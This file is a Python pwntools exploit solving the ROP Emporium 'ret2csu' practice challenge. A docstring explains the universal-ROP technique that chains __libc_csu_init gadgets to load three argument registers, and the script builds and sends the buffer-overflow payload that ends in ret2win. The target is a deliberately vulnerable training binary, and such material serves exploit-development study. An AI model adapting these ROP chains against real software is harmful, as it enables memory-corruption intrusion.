#!/usr/bin/env python3
"""
Though not the most complicated problem, this one took a little more
thought than I anticipated, and a hint or two. 

Though ROPEmporium provides a paper to uROP, the small binary causes
quite a problem, as you don't have any interesting PLT entries to jump
to. In addition to this, you'll need to make a CALL in the uROP chain
that won't mess up your RDX register in particular. To make matters
even worse this CALL requires a POINTER to the function, not just 
the function (which is why it would have been nice if it were in the PLT).

Here are the steps:
    1. Overflow the buffer, return to the sequences of pop in __libc_csu_init
    2. The important registers to load are what becomes R12, RSI and RDX. RDI
    doesn't matter, as we'll call a POP RSI afterwards. Additionally, we can't
    call pop RDI to begin with, as the __libc_csu_init instruction MOV EDI, R13D
    will actually clear the top 4 bytes to 0. Therefore, using the gadget at 00400680
    (the one with the call) will destroy our needed 8-byte paramter no matter what we do.

    R12 will be a pointer to the function _init. This pointer was found by using gef search-pattern.
    RBP - Make sure this is 0 or 1, as if it's anything else, we'll get stuck in the loop calling
    init.

    3. Fall into the 00400680 __libc_csu_init gadget to set up our registers.
    4. After we come back from our call to __init, we will continue through the function,
    taking the jump (because RBP < 2) 
    5. Add in a ton of filler as we'll go back through the first __libc_csu_init gadget,
    and take off 8 bytes from the stack too
    6. Fall back into our POP RDI (now we have all 3 parameters)
    7. Jump to ret2win!

"""

from pwn import * 

gen = cyclic_gen()
data = gen.get(40)

context.terminal = ["tmux", "splitw", "-h"]


p = process("./ret2csu")

pop_rdi = p64(0x004006a3)
ret2win = p64(0x00400510)
ret2win_got = p64(0x00601020)
# Pop rbx, rbp r12 r13 14 r15
# RDX = R15
# RSI = R14
# EDI = R13D
# Call = R12
# Call Offset = RBX
urop_pop = p64(0x0040069a)

urop_load = p64(0x00400680)



data += urop_pop
data += p64(0x0)        # rbx
data += p64(0x01) # rbp - Must be 0 or 1. Prevents our init call from being called several times.
data += p64(0x400398) # Pointer to the init function. Technically in symtab.
data += p64(0xdeadbeefdeadbeef) # Will end up in EDI but we don't care as we'll have to fix it later anyways
data += p64(0xcafebabecafebabe) # RSI
data += p64(0xd00df00dd00df00d) # RDX
data += urop_load # Move all the registers to the correct registers
data += gen.get(7*8) # Filler as we'll pop a lot off the stack
data += pop_rdi # Fix up RDI
data += p64(0xdeadbeefdeadbeef) # The value to put in the first parameter
data += ret2win # Win function.


p.send(data)
p.interactive()
